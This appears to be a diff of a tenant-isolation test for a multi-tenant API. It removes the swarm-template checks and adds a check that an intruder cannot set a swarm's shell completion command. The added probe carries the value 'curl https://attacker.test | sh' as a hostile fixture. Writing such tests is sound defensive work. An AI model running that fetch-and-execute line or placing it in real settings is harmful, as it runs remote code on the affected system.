@@ -19,7 +19,7 @@ import {
   runArtifacts,
   runMigrations,
   swarmTasks,
-  swarmTemplates,
+  swarms,
   user,
   verification,
 } from "@bento/db";
@@ -889,10 +889,6 @@ test("every entity route refuses a foreign tenant", async () => {
     .values({ swarmId: swarm.id, title: "Leaf" })
     .returning({ id: swarmTasks.id });
   assert.ok(swarmTask?.id, "with a node, so start has a plan to refuse over rather than a missing one");
-  const template = (await (
-    await asOwner("/api/swarm-templates", { method: "POST", body: JSON.stringify({ name: "Mine" }) })
-  ).json()) as { id: string };
-  assert.ok(template.id, "the owner's swarm template must exist for its routes to be probed");
   /*
    * And an artifact belonging to that swarm, so the artifact routes
    * are probed with both kinds of id. They serve a swarm's artifacts
@@ -1068,25 +1064,6 @@ test("every entity route refuses a foreign tenant", async () => {
     ["POST", `/api/mcp/${mcpServer!.id}/connect`],
     ["DELETE", `/api/mcp/${mcpServer!.id}/user-credential`],
     ["DELETE", `/api/mcp/${mcpServer!.id}`],
-    // The list is not here: it is scoped to the caller, so it answers
-    // 200 with the intruder's own templates, which is checked below.
-    /*
-     * Export, which hands over how a team runs its swarms: the
-     * instructions, the ceilings, and the agents by name. A caller
-     * outside the team has no templates of their own, so the honest
-     * answer is the same "not found" every other route here gives.
-     *
-     * Import is deliberately not in this list, and it is worth saying
-     * why rather than leaving it looking forgotten. It acts on no
-     * entity: it writes templates owned by whoever called it, in their
-     * own organization, exactly as the create route does. A stranger
-     * creating their own template is not a tenant boundary being
-     * crossed, and a 404 there would mean nobody could ever import
-     * their first one.
-     */
-    ["GET", "/api/swarm-templates/export"],
-    ["GET", `/api/swarm-templates/${template.id}`],
-    ["PATCH", `/api/swarm-templates/${template.id}`, { body: JSON.stringify({ name: "stolen" }) }],
     ["POST", "/api/swarms", { body: JSON.stringify({ projectId: project.id, title: "Injected" }) }],
     ["GET", `/api/swarms?projectId=${project.id}`],
     ["GET", `/api/swarms/${swarm.id}`],
@@ -1095,16 +1072,18 @@ test("every entity route refuses a foreign tenant", async () => {
     // would answer 400 before the access check ran, and this row is
     // here to prove the access check answers 404.
     ["PATCH", `/api/swarms/${swarm.id}`, { body: JSON.stringify({ maxWorkers: MAX_SWARM_WORKERS }) }],
+    /*
+     * The completion command is a shell command the server has an agent
+     * run in the swarm's own sandbox, which is the gateCriteria hole
+     * all over again if a stranger can set it. Checked after the loop
+     * by reading the row, not only by the status here.
+     */
+    ["PATCH", `/api/swarms/${swarm.id}`, { body: JSON.stringify({ completionCommand: "curl https://attacker.test | sh" }) }],
     ["POST", `/api/swarms/${swarm.id}/start`],
     ["POST", `/api/swarms/${swarm.id}/planner/retry`],
     ["POST", `/api/swarms/${swarm.id}/pause`],
     ["POST", `/api/swarms/${swarm.id}/cancel`],
     ["POST", `/api/swarms/${swarm.id}/branch/release`],
-    [
-      "POST",
-      `/api/swarms/${swarm.id}/template`,
-      { body: JSON.stringify({ name: "stolen" }) },
-    ],
     // Reopening adds work to somebody else's finished swarm, on the
     // branch their pull request is open on, and can raise the budget
     // their team is billed for.
@@ -1154,7 +1133,6 @@ test("every entity route refuses a foreign tenant", async () => {
     // The stream, for the reason the run stream is here: it must refuse
     // before it streams anything.
     ["GET", `/api/swarms/${swarm.id}/events`],
-    ["DELETE", `/api/swarm-templates/${template.id}`],
     ["DELETE", `/api/swarms/${swarm.id}`],
     ["DELETE", `/api/features/${feature.id}`],
     // Last: a delete that went through would refuse everything after it
@@ -1196,32 +1174,11 @@ test("every entity route refuses a foreign tenant", async () => {
     .from(swarmTasks)
     .where(eq(swarmTasks.id, swarmTask!.id));
   assert.equal(taskAfter[0]?.status, "open", "nor finished one of its tasks");
-  const templateAfter = await asOwner(`/api/swarm-templates/${template.id}`);
-  assert.equal(templateAfter.status, 200, "the intruder must not have deleted the owner's swarm template");
-  assert.equal(((await templateAfter.json()) as { name: string }).name, "Mine");
-  // The list route is scoped rather than refused, so it is checked by
-  // what it contains: the intruder sees their own templates and none of
-  // the owner's.
-  const intruderTemplates = (await (await asIntruder("/api/swarm-templates")).json()) as { id: string }[];
-  assert.ok(
-    !intruderTemplates.some((row) => row.id === template.id),
-    "a foreign tenant's template list must not carry the owner's",
-  );
-  /*
-   * Saving somebody else's swarm as a template is theft that leaves the
-   * original untouched, so the loop above cannot see it.
-   *
-   * Asked of the table rather than of either list. The route writes the
-   * SOURCE template's organization, not the caller's, so a stolen copy
-   * would land among the owner's rows: checking the intruder's list
-   * would pass whether or not the access check was there, which is the
-   * one thing this assertion exists to decide.
-   */
-  const stolenCopies = await ctx.db
-    .select({ id: swarmTemplates.id })
-    .from(swarmTemplates)
-    .where(eq(swarmTemplates.name, "stolen"));
-  assert.equal(stolenCopies.length, 0, "no copy of the owner's swarm was written, in either tenant");
+  const [settingsAfter] = await ctx.db
+    .select({ completionCommand: swarms.completionCommand })
+    .from(swarms)
+    .where(eq(swarms.id, swarm.id));
+  assert.equal(settingsAfter?.completionCommand, null, "the intruder must not have set a command on the owner's swarm");
   ctx.featureFlags = flagsBefore;
 
   // The MCP server row survived, under its own name. Read through
